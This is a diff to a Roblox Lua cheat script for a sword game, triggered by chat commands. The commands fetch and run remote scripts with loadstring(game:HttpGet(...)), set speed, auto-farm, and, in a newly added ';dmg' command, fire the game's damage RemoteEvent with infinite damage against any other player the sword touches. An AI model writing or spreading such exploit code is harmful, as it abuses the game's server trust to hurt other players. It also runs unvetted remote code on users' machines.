@@ -1,4 +1,4 @@
---// Fixed --//
+--// 2024 fixed//--
 local A_1 = "[Loaded Solex Sword Simulator Admin Commands]"-----message here
 local A_2 = "All"
 local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
@@ -36,14 +36,14 @@ LPlayer.Chatted:Connect(function(msg)
 	else
 		if msg:match(";cmds") then
 			wait(1)
-      local A_1 = "[Admin Commands Are listed in our server please go check.]"-----message here
+      local A_1 = "[The admin commands, have been recently, added in the solex community, server please please go check in the server for more information.]"-----message here
 local A_2 = "All"
 local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
 Event:FireServer(A_1, A_2)
 		else
 			if msg:match(";credits") then
 				wait(1)
-				local A_1 = "[This, this script was developed by Solex Community.]"-----message here
+				local A_1 = "[This script was developed by Cyvex, and VoidXD.]"-----message here
 				local A_2 = "All"
 				local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
 				Event:FireServer(A_1, A_2)
@@ -134,7 +134,6 @@ Event:FireServer(A_1, A_2)
 			else
 			 
 if msg:match(";farm") then
-wait(1)
 _G.farm = true
 
 		while wait() do
@@ -153,7 +152,6 @@ _G.farm = true
 			 
 
 if msg:match(";unfarm") then
-wait(1)
 _G.farm = false
 
 		while wait() do
@@ -179,11 +177,11 @@ _G.farm = false
 			else
 
 			if msg:match(";utg") then
-				-- Codeey get's no bitchs
+				-- Codeey get's no bitchs --
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Cold2004/Own1/main/UTG.lua",true))()
 			else
 			
-                   if msg:match(";Neptune") then
+                   if msg:match(";neptune") then
 				-- Neptune Sword Script
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Cold2004/Own1/main/Neptune.lua",true))()
 			else
@@ -193,9 +191,39 @@ _G.farm = false
             game.Players.LocalPlayer.Character.Humanoid.Health = 0
 			else
 			
-			if msg:match(";Afk") then
+			if msg:match(";afk") then
 				-- Rice-Anti-Afk
              loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
+			else
+
+
+			if msg:match(";dmg") then
+				local player = game.Players.LocalPlayer
+local character = player.Character
+local backpack = player.Backpack
+local swords = {}
+function look(dir)
+    for i, v in pairs(dir:GetChildren()) do
+        if(v:IsA("Tool"))then
+            table.insert(swords,v)
+        end
+    end
+end
+look(backpack)
+look(character)
+    
+for i, v in pairs(swords)do
+    local sword = v
+    sword.Parent = backpack
+    sword.Handle.Massless = true
+    sword.Handle.CanCollide = true
+    sword.Parent = character
+    sword.Handle.Touched:Connect(function(t)
+        if(t.Parent)and(t.Parent:FindFirstChild("Humanoid"))and(t.Parent.Name~=player.Name)then
+            sword.Handle.dmg.RemoteEvent:FireServer(t.Parent.Humanoid, math.huge)
+        end
+    end)
+end
 			else
 			
 			if msg:match(";god giver") then
@@ -210,6 +238,10 @@ _G.farm = false
 
 			if msg:match(";speed me 100") then
 				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed + 100
+			else
+
+                        if msg:match(";speed me 50") then
+				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed + 50
 			else
 			
 			if msg:match(";gui") then
@@ -228,7 +260,7 @@ _G.farm = false
 			loadstring(game:HttpGet("https://avascripting.000webhostapp.com/Blacklist%20Community.lua",true))()
 			else
 
-            if msg:match(";Discord") then
+            if msg:match(";discord") then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayripsus/Jayripsus/main/Discord/.lua",true))()
 			else
 
@@ -249,7 +281,7 @@ end
 end)
 			else	
 	
-                        if msg:match(";Red Sword") then
+                        if msg:match(";red sword") then
 			local number = 1
 for i = 1, 100 do
  local Player = game.Players.LocalPlayer
@@ -281,7 +313,7 @@ end
 -- end of the script
 			else
 
-                        if msg:match(";Black Sword") then
+                        if msg:match(";black sword") then
 			local number = 1
 for i = 1, 100 do
  local Player = game.Players.LocalPlayer
@@ -392,6 +424,8 @@ end
 		    end
 	    end
 	end
+end
+end
 end
 end
 end
